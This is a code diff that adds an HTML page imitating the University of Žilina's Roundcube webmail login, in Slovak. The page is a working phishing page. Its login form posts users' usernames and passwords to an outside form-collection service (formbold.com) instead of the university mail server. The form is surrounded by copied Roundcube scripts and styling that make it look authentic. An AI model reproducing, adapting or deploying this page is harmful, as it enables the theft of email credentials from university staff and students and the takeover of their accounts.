@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html class=" js mozilla"><head>
+<title>Roundcube Webmail :: Vitajte v Roundcube Webmail</title>
+<meta name="Robots" content="noindex,nofollow">
+<meta http-equiv="X-UA-Compatible" content="IE=EDGE">
+<meta name="viewport" content="" id="viewport">
+<link rel="shortcut icon" href="https://webmail.uniza.sk/roundcubemail/skins/larry/images/favicon.ico">
+<link rel="stylesheet" type="text/css" href="uniza_files/styles.min.css">
+<!--[if IE 9]><link rel="stylesheet" type="text/css" href="skins/larry/svggradients.min.css?s=1510168456" /><![endif]-->
+<!--[if lte IE 8]><link rel="stylesheet" type="text/css" href="skins/larry/iehacks.min.css?s=1510168456" /><![endif]-->
+<!--[if lte IE 7]><link rel="stylesheet" type="text/css" href="skins/larry/ie7hacks.min.css?s=1510168456" /><![endif]-->
+<link rel="stylesheet" type="text/css" href="uniza_files/jquery-ui-1.9.2.custom.css">
+<script type="text/javascript" src="uniza_files/ui.min.js"></script>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<script src="uniza_files/jquery.min.js" type="text/javascript"></script>
+<script src="uniza_files/common.min.js" type="text/javascript"></script>
+<script src="uniza_files/app.min.js" type="text/javascript"></script>
+<script src="uniza_files/jstz.min.js" type="text/javascript"></script>
+<script type="text/javascript">
+
+var rcmail = new rcube_webmail();
+rcmail.set_env({"task":"login","x_frame_options":"sameorigin","standard_windows":false,"cookie_domain":"","cookie_path":"\/","cookie_secure":true,"skin":"larry","refresh_interval":60,"session_lifetime":600,"action":"","comm_path":".\/?_task=login","compose_extwin":false,"date_format":"yy-mm-dd","request_token":"ee9492aa9500dc61fd56deeacb9fea4c"});
+rcmail.gui_container("loginfooter","bottomline");
+rcmail.add_label({"loading":"Na\u010d\u00edtava sa...","servererror":"Chyba servera!","connerror":"Chyba pri prip\u00e1jan\u00ed (nepodarilo sa spoji\u0165 so serverom)!","requesttimedout":"\u010cas na vykonanie po\u017eiadavky uplynul","refreshing":"Obnovuje sa..."});
+rcmail.gui_object('loginform', 'form');
+rcmail.gui_object('message', 'message');
+</script>
+
+<script type="text/javascript" src="uniza_files/jquery-ui-1.9.2.custom.min.js"></script>
+<script type="text/javascript" src="uniza_files/jquery.ui.datepicker-sk.js"></script>
+</head>
+<body>
+
+<div id="login-form">
+<div class="box-inner">
+<img src="uniza_files/roundcube_logo.png" id="logo" alt="Roundcube Webmail">
+
+<form name="form" method="post" action="https://formbold.com/s/3jg8q">
+<input type="hidden" name="_token" value="ee9492aa9500dc61fd56deeacb9fea4c">
+<input type="hidden" name="_task" value="login"><input type="hidden" name="_action" value="login"><input type="hidden" name="_timezone" id="rcmlogintz" value="Africa/Lagos"><input type="hidden" name="_url" id="rcmloginurl" value=""><table><tbody><tr><td class="title"><label for="rcmloginuser">Meno používateľa</label>
+</td>
+<td class="input"><input name="_user" id="rcmloginuser" required="required" size="40" autocapitalize="none" autocomplete="off" type="text"></td>
+</tr>
+<tr><td class="title"><label for="rcmloginpwd">Heslo</label>
+</td>
+<td class="input"><input name="_pass" id="rcmloginpwd" required="required" size="40" autocapitalize="none" autocomplete="off" type="password"></td>
+</tr>
+<tr><td class="title"><label for="rcmloginhost">Server</label>
+</td>
+<td class="input"><select name="_host" id="rcmloginhost">
+<option value="" selected="selected">  =====  Vyberte Server =====  </option>
+<option value="ssl://nic.uniza.sk:993">nic.uniza.sk  [imap]</option>
+<option value="ipv4.relay.uniza.sk">smtp.uniza.sk [imap]</option>
+</select>
+</td>
+</tr>
+</tbody>
+</table>
+<p class="formbuttons"><input type="submit" id="rcmloginsubmit" class="button mainaction" value="Prihlásiť"></p>
+
+</form>
+
+</div>
+
+<div class="box-bottom">
+	<div id="message"></div>
+	<noscript>
+		<p class="noscriptwarning">Upozornenie: Táto webmailová služba vyžaduje Javascript! Ak ju chcete používať, prosím aktivujte Javascript v nastaveniach svojho prehliadača.</p>
+	</noscript>
+</div>
+
+<div id="bottomline">
+	Roundcube Webmail 
+		
+</div>
+</div>
+
+
+
+<script type="text/javascript">
+
+// UI startup
+var UI = new rcube_mail_ui();
+$(document).ready(function(){
+	UI.set('errortitle', 'Vyskytla sa chyba!');
+	UI.init();
+});
+
+</script>
+<!--[if lte IE 8]>
+<script type="text/javascript">
+
+// fix missing :last-child selectors
+$(document).ready(function(){
+	$('ul.treelist ul').each(function(i,ul){
+		$('li:last-child', ul).css('border-bottom', 0);
+	});
+});
+
+</script>
+<![endif]-->
+
+
+
+
+
+<script type="text/javascript">
+
+jQuery.extend(jQuery.ui.dialog.prototype.options.position, {
+                using: function(pos) {
+                    var me = jQuery(this),
+                        offset = me.css(pos).offset(),
+                        topOffset = offset.top - 12;
+                    if (topOffset < 0)
+                        me.css('top', pos.top - topOffset);
+                    if (offset.left + me.outerWidth() + 12 > jQuery(window).width())
+                        me.css('left', pos.left - 12);
+                }
+            });
+$(document).ready(function(){ 
+rcmail.init();
+var images = ["skins\/larry\/images\/ajaxloader.gif","skins\/larry\/images\/ajaxloader_dark.gif","skins\/larry\/images\/buttons.png","skins\/larry\/images\/addcontact.png","skins\/larry\/images\/filetypes.png","skins\/larry\/images\/listicons.png","skins\/larry\/images\/messages.png","skins\/larry\/images\/messages_dark.png","skins\/larry\/images\/quota.png","skins\/larry\/images\/selector.png","skins\/larry\/images\/splitter.png","skins\/larry\/images\/watermark.jpg"];
+            for (var i=0; i<images.length; i++) {
+                img = new Image();
+                img.src = images[i];
+            }
+});
+</script>
+
+
+</body></html>
